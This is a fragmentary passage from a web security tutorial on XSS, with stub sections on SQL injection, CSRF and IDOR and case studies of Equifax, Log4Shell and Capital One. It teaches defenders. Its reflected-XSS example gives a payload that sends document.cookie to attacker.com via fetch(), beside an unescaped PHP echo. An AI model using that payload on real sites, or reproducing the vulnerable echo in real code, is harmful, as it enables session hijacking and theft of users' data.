<h3>Why Web Applications Are the Primary Attack Surface</h3>
<p>
  Web applications represent the largest and most consistently exploited attack surface in
  modern organizations. They are internet-facing by design, continuously developed under
  competitive time pressure, built by teams whose primary incentive is feature velocity, and
  they handle the most sensitive data an organization possesses: customer records, payment

<h3>SQL Injection: History, Mechanics, and Full Taxonomy</h3>

<h4>How Relational Databases Work and Why Concatenation Is Dangerous</h4>
<p>

<h3>Cross-Site Scripting (XSS): The DOM, Trust, and Execution Context</h3>

<h4>Why Browsers Trust Scripts on a Page</h4>
<p>
  The browser's security model is built around the Same-Origin Policy (SOP): scripts loaded
  from <code>https://example.com</code> can access cookies, localStorage, and the DOM of pages
  from <code>https://example.com</code>, but not from other origins. The SOP assumes that any
  script running in the context of a website was intentionally placed there by the site's
  developers. XSS violates this assumption by injecting attacker-controlled script into the
  site's context. Once the browser executes that script, it has full access to everything the
  legitimate site's JavaScript can access — cookies (unless HttpOnly), localStorage, session
  data, the full DOM, and the ability to make authenticated HTTP requests to the server.
</p>

<h4>Reflected vs. Stored vs. DOM-Based XSS</h4>
<p>
  <strong>Reflected XSS:</strong> The malicious script is embedded in a URL parameter that
  the server echoes back into the page without encoding. The attacker sends the crafted URL
  to a victim via email or social media. When the victim clicks, their browser executes the
  script in the site's context:
</p>
<pre><code># Vulnerable search endpoint (PHP):
echo "Search results for: " . $_GET['q'];

# Attacker crafts URL:
/search?q=&lt;script&gt;fetch('https://attacker.com/steal?c='+document.cookie)&lt;/script&gt;

# Victim clicks link: cookie sent to attacker.com; attacker hijacks session</code></pre>
<p>
  <strong>Stored (Persistent) XSS:</strong> The payload is saved in the database and served
  to every user who views the affected content — forum posts, product reviews, chat messages,
  profile fields. This is the highest-impact variant: a single injection can execute against
  thousands or millions of users. The 2005 MySpace Samy worm used stored XSS to spread to
  one million users in under 24 hours.
</p>
<p>
  <strong>DOM-Based XSS:</strong> The vulnerability exists entirely in client-side JavaScript.
  The server sends a clean HTML page, but the page's JavaScript reads from an
  attacker-controlled source (URL hash, document.referrer, postMessage) and writes it to the
  DOM without encoding. The server never sees the malicious payload — only the victim's browser
  processes it. Server-side WAFs cannot detect DOM-based XSS at the server layer.
</p>

<h4>XSS Beyond Cookie Theft</h4>
<ul>
  <li><strong>Keylogger injection:</strong> JavaScript event listeners capture every keystroke
  typed on the domain — including passwords — and exfiltrate them in real time to the attacker's
  server via background XHR requests.</li>
  <li><strong>BeEF (Browser Exploitation Framework) hooking:</strong> XSS injects the BeEF
  hook script, turning the victim's browser into a remotely controlled agent. The attacker's
  dashboard can launch browser-specific exploits, port scan internal networks from the victim's
  browser, conduct phishing overlays, and pivot through the victim's authenticated sessions.</li>
  <li><strong>Internal network scanning:</strong> JavaScript in the victim's browser can make
  XMLHttpRequests to internal IP addresses, effectively scanning the internal network from
  inside the corporate perimeter — bypassing all perimeter firewall controls. Response timing
  reveals which ports are open.</li>
  <li><strong>CSRF token bypass:</strong> If the XSS is stored on the same page containing
  a CSRF token, the injected script reads the token directly and performs authenticated
  state-changing operations on behalf of the victim — without any credential theft.</li>
  <li><strong>Admin panel compromise:</strong> Stored XSS that executes when an administrator
  views the infected content inherits admin privileges in the admin's browser session,
  enabling account creation, configuration changes, and data exfiltration.</li>
</ul>

<h3>Cross-Site Request Forgery (CSRF): The Browser Cookie Trust Model</h3>
<p>

  sessions — and what makes CSRF possible. When a logged-in user visits attacker.com, the
  attacker's page causes the user's browser to make a request to bank.com, and the browser

<h3>Insecure Direct Object Reference (IDOR)</h3>
<p>

  user's invoice. IDOR enables horizontal privilege escalation (accessing other users' data
  at the same privilege level) and vertical privilege escalation (accessing admin functions
  by guessing admin-level object IDs).

<h3>Real-World Case Studies</h3>

<h4>Equifax 2017: Apache Struts RCE (CVE-2017-5638)</h4>
<p>
  The Equifax breach exposed 147 million Americans' credit records. The vulnerability was in
  Apache Struts 2's file upload handling — the Content-Type HTTP header was passed to the
  OGNL expression evaluator without sanitization. An attacker sending a crafted Content-Type
  header achieved remote code execution with the web server's privileges. Equifax was notified
  of the vulnerability in March 2017 and failed to patch before exploitation began in May 2017.
  The patch had been available for weeks before the breach.
</p>

<h4>Log4Shell 2021: JNDI Injection (CVE-2021-44228)</h4>
<p>
  Log4j, a ubiquitous Java logging library, evaluated JNDI (Java Naming and Directory Interface)
  lookup strings found in logged messages. Any user-controlled string that ended up in a log
  message could trigger a JNDI lookup: a User-Agent header containing the JNDI lookup syntax
  caused the logging library to make an outbound LDAP request to the attacker's server, which
  responded with a Java class file that Log4j loaded and executed. The vulnerability affected
  virtually every Java application using Log4j 2.x — estimated at hundreds of millions of
  deployments. The attack surface included any input that was logged: usernames, search terms,
  HTTP headers, API request bodies.
</p>

<h4>Capital One 2019: SSRF to Cloud Metadata</h4>
<p>
  A misconfigured AWS WAF's EC2 instance was vulnerable to SSRF. An attacker (a former AWS
